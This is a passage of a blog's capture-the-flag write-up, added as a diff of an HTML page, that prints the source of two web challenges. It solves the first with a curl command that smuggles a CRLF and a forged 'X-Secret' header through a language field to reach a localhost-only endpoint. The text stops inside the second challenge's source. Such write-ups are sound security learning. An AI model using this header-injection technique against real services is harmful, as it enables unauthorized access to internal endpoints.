@@ -1,0 +1,524 @@
+<!doctype html><html lang="en"
+   data-mode="dark">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Gynvael Coldwind Twitter Challenges | Sud0u53r&#39;s Blog</title><link rel="apple-touch-icon" href="http://localhost:1313/images/favicons/apple-touch-icon.png" sizes="180x180">
+<link rel="icon" href="http://localhost:1313/images/favicons/favicon-32x32.png" sizes="32x32" type="image/png">
+<link rel="icon" href="http://localhost:1313/images/favicons/favicon-16x16.png" sizes="16x16" type="image/png">
+<link rel="manifest" href="http://localhost:1313/images/favicons/manifest.json">
+<link rel="icon" href="http://localhost:1313/images/favicons/favicon.ico">
+<meta name="keywords" content="" />
+<meta name="description" content="Solved some nodejs twitter challenges posted by Gynvael coldwind on twitter" />
+
+<meta itemprop="name" content="Gynvael Coldwind Twitter Challenges">
+<meta itemprop="description" content="Solved some nodejs twitter challenges posted by Gynvael coldwind on twitter"><meta itemprop="datePublished" content="2020-08-27T08:59:32+05:30" />
+<meta itemprop="dateModified" content="2020-08-27T08:59:32+05:30" />
+<meta itemprop="wordCount" content="745"><meta itemprop="image" content='http://localhost:1313/en/posts/gynvael-coldwind-twitter-challenges/images/_card.png'>
+<meta itemprop="keywords" content="twitter,challenge,writeups,web," /><meta property="og:title" content="Gynvael Coldwind Twitter Challenges" />
+<meta property="og:description" content="Solved some nodejs twitter challenges posted by Gynvael coldwind on twitter" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/en/posts/gynvael-coldwind-twitter-challenges/" /><meta property="og:image" content='http://localhost:1313/en/posts/gynvael-coldwind-twitter-challenges/images/_card.png' /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2020-08-27T08:59:32+05:30" />
+<meta property="article:modified_time" content="2020-08-27T08:59:32+05:30" />
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:image" content='http://localhost:1313/en/posts/gynvael-coldwind-twitter-challenges/images/_card.png'/>
+
+<meta name="twitter:title" content="Gynvael Coldwind Twitter Challenges"/>
+<meta name="twitter:description" content="Solved some nodejs twitter challenges posted by Gynvael coldwind on twitter"/>
+<link rel="preload" href="http://localhost:1313/css/bundle.min.01de153b8016128bb7e4bbe9a9889c916c2aa0ad91c9f1d0964179ebb4854647.css" integrity="sha256-Ad4VO4AWEou35LvpqYickWwqoK2RyfHQlkF567SFRkc=" crossorigin="anonymous" as="style" onload="this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="http://localhost:1313/css/bundle.min.01de153b8016128bb7e4bbe9a9889c916c2aa0ad91c9f1d0964179ebb4854647.css" integrity="sha256-Ad4VO4AWEou35LvpqYickWwqoK2RyfHQlkF567SFRkc=" crossorigin="anonymous"></noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Consolas" type="text/css" media="all" referrerpolicy="no-referrer" />
+
+
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter" type="text/css" media="all" />
+<style>
+ body { font-family: 'Inter'; }
+ code { font-family: 'Fira Code'; }
+ code { tab-size: 4; }
+</style></head>
+  <body><script src="http://localhost:1313/js/bootstrap.min.062c2e66b557cb779d59cedff7e0cc76e84beb665a1076e474e87d940be44245.js" integrity="sha256-BiwuZrVXy3edWc7f9&#43;DMduhL62ZaEHbkdOh9lAvkQkU=" crossorigin="anonymous"></script><header><nav class="navbar top-app-bar top-app-bar-expand-lg fixed-top">
+  <div class="container">
+    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarSupportedContent"
+      aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <i class="fas fa-bars"></i>
+    </button><a class="navbar-brand me-3" href="http://localhost:1313/en/">Sud0u53r&#39;s Blog
+    </a>
+    <button class="navbar-social-share" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasSocialShare"
+  aria-controls="offcanvasSocialShare" aria-label="Toggle social share">
+  <i class="fas fa-share-alt"></i>
+</button>
+
+<div class="offcanvas offcanvas-bottom surface" tabindex="-1" id="offcanvasSocialShare" aria-labelledby="offcanvasSocialShare">
+  <div class="offcanvas-header">
+    <h3 class="offcanvas-title">Share</h3>
+    <button type="button" class="btn btn-sm btn-outline-primary" data-bs-dismiss="offcanvas" aria-label="Close">
+      <i class="fas fa-times"></i>
+    </button>
+  </div>
+  <div class="offcanvas-body">
+    <a class="btn btn-sm btn-outline-primary social-share-button" rel="noopener noreferrer" aria-label="Twitter Share Button"
+      target="_blank" href="https://twitter.com/intent/tweet?title=Gynvael%20Coldwind%20Twitter%20Challenges&url=http%3a%2f%2flocalhost%3a1313%2fen%2fposts%2fgynvael-coldwind-twitter-challenges%2f">
+      <i class="fab fa-fw fa-twitter"></i> Twitter
+    </a>
+    <a class="btn btn-sm btn-outline-primary social-share-button" rel="noopener noreferrer" aria-label="Facebook Share Button"
+      target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fen%2fposts%2fgynvael-coldwind-twitter-challenges%2f">
+      <i class="fab fa-fw fa-facebook-f"></i> Facebook
+    </a>
+  </div>
+</div>
+    <button class="navbar-settings" type="button" data-bs-toggle="offcanvas" data-bs-target="#offcanvasSettings"
+  aria-controls="offcanvasSettings" aria-label="Toggle settings">
+  <i class="fas fa-ellipsis-v"></i>
+</button>
+
+<div class="offcanvas offcanvas-end surface h-100" tabindex="-1" id="offcanvasSettings" aria-labelledby="offcanvasSettings">
+  <div class="offcanvas-header">
+    <h3 class="offcanvas-title">Settings</h3>
+    <button type="button" class="btn btn-sm btn-outline-primary" data-bs-dismiss="offcanvas" aria-label="Close">
+      <i class="fas fa-times"></i>
+    </button>
+  </div>
+  <div class="offcanvas-body">
+
+
+
+<section class="setting">
+  <form class="font-size-switcher-form row">
+    <div class="col-auto">
+      <label for="fontSize" class="form-label"><i class="fas fa-fw fa-font"></i> Font Size</label>
+    </div>
+    <div class="col-auto ms-auto">
+      <input type="range" class="form-range" min="-2" max="2" id="fontSize">
+    </div>
+  </form>
+</section>
+
+
+<section class="setting palettes">
+  <form class="row">
+    <div class="col-auto">
+      <label><i class="fas fa-fw fa-palette"></i> Palette</label>
+    </div>
+    <div class="col-auto ms-auto">
+      <a id="btnPalette" class="btn btn-sm btn-outline-primary" role="button" aria-label="palettePicker">
+        <i class="fas fa-eye-dropper"></i>
+      </a>
+    </div>
+  </form>
+  <div class="mt-2 d-flex visually-hidden" id="palettePicker"><button type="button" id="palette-blue" aria-label="Blue"
+        class="btn btn-sm palette" data-palette="blue">
+      </button><button type="button" id="palette-blue-gray" aria-label="Blue Gray"
+        class="btn btn-sm palette" data-palette="blue-gray">
+      </button><button type="button" id="palette-brown" aria-label="Brown"
+        class="btn btn-sm palette" data-palette="brown">
+      </button><button type="button" id="palette-cyan" aria-label="Cyan"
+        class="btn btn-sm palette" data-palette="cyan">
+      </button><button type="button" id="palette-green" aria-label="Green"
+        class="btn btn-sm palette" data-palette="green">
+      </button><button type="button" id="palette-indigo" aria-label="Indigo"
+        class="btn btn-sm palette" data-palette="indigo">
+      </button><button type="button" id="palette-orange" aria-label="Orange"
+        class="btn btn-sm palette" data-palette="orange">
+      </button><button type="button" id="palette-pink" aria-label="Pink"
+        class="btn btn-sm palette" data-palette="pink">
+      </button><button type="button" id="palette-purple" aria-label="Purple"
+        class="btn btn-sm palette" data-palette="purple">
+      </button><button type="button" id="palette-red" aria-label="Red"
+        class="btn btn-sm palette" data-palette="red">
+      </button><button type="button" id="palette-teal" aria-label="Teal"
+        class="btn btn-sm palette" data-palette="teal">
+      </button><button type="button" id="palette-yellow" aria-label="Yellow"
+        class="btn btn-sm palette" data-palette="yellow">
+      </button></div>
+</section>
+</div>
+</div>
+
+    <div class="collapse navbar-collapse" tabindex="-1" id="navbarSupportedContent" aria-labelledby="navbarSupportedContent">
+      
+      <ul class="navbar-nav ms-auto"><li class="nav-item">
+          <a class="nav-link" href="http://localhost:1313/en/archives/">
+            <i class="fas fa-fw fa-file-archive"></i>Archives
+          </a>
+        </li><li class="nav-item">
+          <a class="nav-link" href="http://localhost:1313/en/categories/">
+            <i class="fas fa-fw fa-folder"></i>Categories
+          </a>
+        </li><li class="nav-item">
+          <a class="nav-link" href="http://localhost:1313/en/tags/">
+            <i class="fas fa-fw fa-tags"></i>Tags
+          </a>
+        </li><li class="nav-item">
+          <a class="nav-link" href="http://localhost:1313/en/series/">
+            <i class="fas fa-fw fa-columns"></i>Series
+          </a>
+        </li></ul>
+    </div>
+  </div>
+</nav>
+</header>
+<main role="main" class="container">
+      <div class="row content">
+<div class="col-lg-8">
+  <div class="container"><nav class="row card component" aria-label="breadcrumb">
+  <div class="card-body">
+    <ol class="breadcrumb "><li class="breadcrumb-item"><a href="http://localhost:1313/en/">Home</a></li><li class="breadcrumb-item"><a href="http://localhost:1313/en/posts/">Posts</a></li><li class="breadcrumb-item active">Gynvael Coldwind Twitter Challenges</li></ol>
+  </div>
+</nav>    <article class="row card component mb-4 post"><div class="post-panel-wrapper">
+  <div class="d-flex flex-column component rounded post-panel">
+    
+    <a id="sidebarToggler" class="action d-none d-lg-block" role="button">
+  <i class="fas fa-fw fa-expand-alt" data-fa-transform="rotate-45"></i>
+</a>
+  
+    
+
+    
+    
+    <a class="action" data-bs-toggle="offcanvas" href="#offcanvasTOC" aria-controls="offcanvasTOC" role="button">
+  <i class="fas fa-fw fa-list-alt"></i>
+</a>
+    
+  </div>
+</div>
+<div class="card-body">
+        <h1 class="card-title my-3">Gynvael Coldwind Twitter Challenges
+</h1><div class="post-meta"><span class="post-date" title="created on">
+    <i class="fas fa-fw fa-calendar-alt"></i>Aug 27, 2020
+  </span><span class="post-reading-time" title="reading time">
+    <i class="fas fa-fw fa-coffee"></i>4 min read
+  </span><a href="http://localhost:1313/en/categories/twitter-challenge/" class="badge rounded-pill text-white bg-primary post-taxonomy">twitter challenge</a><a href="http://localhost:1313/en/tags/twitter/" class="badge rounded-pill text-white bg-primary post-taxonomy">twitter</a><a href="http://localhost:1313/en/tags/challenge/" class="badge rounded-pill text-white bg-primary post-taxonomy">challenge</a><a href="http://localhost:1313/en/tags/writeups/" class="badge rounded-pill text-white bg-primary post-taxonomy">writeups</a><a href="http://localhost:1313/en/tags/web/" class="badge rounded-pill text-white bg-primary post-taxonomy">web</a></div>
+<div class="offcanvas offcanvas-end surface h-100" tabindex="-1" id="offcanvasTOC" aria-labelledby="offcanvasTOCLabel">
+  <div class="offcanvas-header">
+    <h2 class="offcanvas-title" id="offcanvasTOCLabel">Table Of Contents</h5>
+      <button type="button" class="btn btn-sm btn-outline-primary" data-bs-dismiss="offcanvas" aria-label="Close">
+        <i class="fas fa-times"></i>
+      </button>
+  </div>
+  <div class="offcanvas-body">
+    <nav id="TableOfContents">
+  <ul>
+    <li><a href="#challenge-1">Challenge 1</a></li>
+    <li><a href="#challenge-2">Challenge 2</a></li>
+    <li><a href="#challenge-4">Challenge 4</a>
+      <ul>
+        <li></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+  </div>
+</div><div class="post-content mb-3"><p>Scrolling through the twitter, I found a series of nodejs challenges posted by <a href="https://twitter.com/gynvael" target="_blank" rel="noopener noreferrer">@gynvael</a>
+. I gave it a try and solved 3 out of 5 challenges!</p>
+<p>Here are the writeups for the challenges I have solved&hellip;</p>
+<h2 id="challenge-1">Challenge 1</h2>
+<p><strong>Challenge URL:</strong> <a href="http://35.204.139.205:5000/" target="_blank" rel="noopener noreferrer">http://35.204.139.205:5000/</a>
+<br>
+<strong>Source code:</strong> <a href="files/chall1.py">source.py</a>
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-py3" data-lang="py3"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> Flask, request, Response, render_template_string
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> urllib.parse <span style="color:#f92672">import</span> urlparse
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>app <span style="color:#f92672">=</span> Flask(__name__)
+</span></span><span style="display:flex;"><span>FLAG <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>environ<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;FLAG&#39;</span>, <span style="color:#e6db74">&#34;???&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;task.py&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>	SOURCE <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/secret&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">secret</span>():
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>remote_addr <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Access denied!&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>headers<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;X-Secret&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>) <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#34;YEAH&#34;</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Nope.&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;GOOD WORK! Flag is </span><span style="color:#e6db74">{</span>FLAG<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> render_template_string(
+</span></span><span style="display:flex;"><span>			<span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">			&amp;lt;html&amp;gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">				&amp;lt;body&amp;gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">					&amp;lt;h1&amp;gt;URL proxy with language preference!&amp;lt;/h1&amp;gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">					&amp;lt;form action=&#34;/fetch&#34; method=&#34;POST&#34;&amp;gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">						&amp;lt;p&amp;gt;URL: &amp;lt;input name=&#34;url&#34; value=&#34;http://gynvael.coldwind.pl/&#34;&amp;gt;&amp;lt;/p&amp;gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">						&amp;lt;p&amp;gt;Language code: &amp;lt;input name=&#34;lang&#34; value=&#34;en-US&#34;&amp;gt;&amp;lt;/p&amp;gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">						&amp;lt;p&amp;gt;&amp;lt;input type=&#34;submit&#34;&amp;gt;&amp;lt;/p&amp;gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">					&amp;lt;/form&amp;gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">					&amp;lt;pre&amp;gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Task source:
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">{{ src }}
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">					&amp;lt;/pre&amp;gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">				&amp;lt;/body&amp;gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">			&amp;lt;/html&amp;gt;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">			&#34;&#34;&#34;</span>, src<span style="color:#f92672">=</span>SOURCE)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app.route</span>(<span style="color:#e6db74">&#39;/fetch&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#34;POST&#34;</span>])
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fetch</span>():
+</span></span><span style="display:flex;"><span>	url <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;url&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>	lang <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>form<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#34;lang&#34;</span>, <span style="color:#e6db74">&#34;en-US&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> url:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;URL must be provided&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	data <span style="color:#f92672">=</span> fetch_url(url, lang)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> data <span style="color:#f92672">is</span> <span style="color:#66d9ef">None</span>:
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;Failed.&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> Response(data, mimetype<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;text/plain;charset=utf-8&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">fetch_url</span>(url, lang):
+</span></span><span style="display:flex;"><span>	o <span style="color:#f92672">=</span> urlparse(url)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	req <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>join([
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;GET </span><span style="color:#e6db74">{</span>o<span style="color:#f92672">.</span>path<span style="color:#e6db74">}</span><span style="color:#e6db74"> HTTP/1.1&#34;</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Host: </span><span style="color:#e6db74">{</span>o<span style="color:#f92672">.</span>netloc<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Connection: close&#34;</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Accept-Language: </span><span style="color:#e6db74">{</span>lang<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;&#34;</span>,
+</span></span><span style="display:flex;"><span>		<span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>	])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	res <span style="color:#f92672">=</span> o<span style="color:#f92672">.</span>netloc<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#39;:&#39;</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> len(res) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
+</span></span><span style="display:flex;"><span>		host <span style="color:#f92672">=</span> res[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>		port <span style="color:#f92672">=</span> <span style="color:#ae81ff">80</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>		host <span style="color:#f92672">=</span> res[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>		port <span style="color:#f92672">=</span> int(res[<span style="color:#ae81ff">1</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	data <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">with</span> socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET, socket<span style="color:#f92672">.</span>SOCK_STREAM) <span style="color:#66d9ef">as</span> s:
+</span></span><span style="display:flex;"><span>		s<span style="color:#f92672">.</span>connect((host, port))
+</span></span><span style="display:flex;"><span>		s<span style="color:#f92672">.</span>sendall(req<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+</span></span><span style="display:flex;"><span>			data_part <span style="color:#f92672">=</span> s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> data_part:
+</span></span><span style="display:flex;"><span>				<span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>			data <span style="color:#f92672">+=</span> data_part
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> data
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>	app<span style="color:#f92672">.</span>run(debug<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, host<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;0.0.0.0&#34;</span>)
+</span></span></code></pre></div><blockquote>
+<p><strong>Solution</strong></p>
+<p><strong>cURL command:</strong> curl -XPOST &lsquo;http://35.204.139.205:5000/fetch&rsquo; &ndash;data-raw &lsquo;url=http://localhost:5000/secret&amp;lang=XX%0D%0AX-Secret:%20YEAH&rsquo;</p>
+<p><strong>Explanation</strong></p>
+<p>The lang parameter is not whitelisted and is passed directly into the headers of request. So we can insert a CRLF and required header (X-Secret) with value YEAH and send the request to localhost:5000/secret asking for flag!</p></blockquote>
+<hr>
+<h2 id="challenge-2">Challenge 2</h2>
+<p><strong>Challenge URL:</strong> <a href="http://challenges.gynvael.stream:5002/" target="_blank" rel="noopener noreferrer">http://challenges.gynvael.stream:5002/</a>
+<br>
+<strong>Source code:</strong> <a href="files/chall2.js">source.js</a>
+</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:2;-o-tab-size:2;tab-size:2;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">express</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;express&#34;</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">fs</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">require</span>(<span style="color:#e6db74">&#34;fs&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">PORT</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">5002</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">FLAG</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">process</span>.<span style="color:#a6e22e">env</span>.<span style="color:#a6e22e">FLAG</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">&#34;???&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">SOURCE</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">fs</span>.<span style="color:#a6e22e">readFileSync</span>(<span style="color:#e6db74">&#34;app.js&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">const</span> <span style="color:#a6e22e">app</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">express</span>();
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">get</span>(<span style="color:#e6db74">&#34;/&#34;</span>, (<span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">res</span>) =&gt; {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">statusCode</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">200</span>;
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">setHeader</span>(<span style="color:#e6db74">&#34;Content-Type&#34;</span>, <span style="color:#e6db74">&#34;text/plain;charset=utf-8&#34;</span>);
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">write</span>(<span style="color:#e6db74">&#34;Level 2\n\n&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(<span style="color:#e6db74">&#34;X&#34;</span> <span style="color:#66d9ef">in</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>)) {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#a6e22e">SOURCE</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">X</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">800</span>) {
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">s</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">X</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">s</span>.<span style="color:#a6e22e">length</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">100</span>) {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#34;Go away.&#34;</span>);
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">try</span> {
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">k</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&amp;lt;&#34;</span> <span style="color:#f92672">+</span> <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">X</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;&amp;gt;&#34;</span>;
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#34;Close, but no cigar.&#34;</span>);
+</span></span><span style="display:flex;"><span>		} <span style="color:#66d9ef">catch</span> {
+</span></span><span style="display:flex;"><span>			<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#a6e22e">FLAG</span>);
+</span></span><span style="display:flex;"><span>		}
+</span></span><span style="display:flex;"><span>	} <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">res</span>.<span style="color:#a6e22e">end</span>(<span style="color:#e6db74">&#34;No way.&#34;</span>);
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">app</span>.<span style="color:#a6e22e">listen</span>(<span style="color:#a6e22e">PORT</span>, () =&gt; {
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">console</span>.<span style="color:#a6e22e">log</span>(<span style="color:#e6db74">`Challenge listening at port </span><span style="color:#e6db74">${</span><span style="color:#a6e22e">PORT</span><span style="color:#e6db74">}</span><span style="color:#e6db74">`</span>);
+</span></span><span style="display:flex;"><span>});
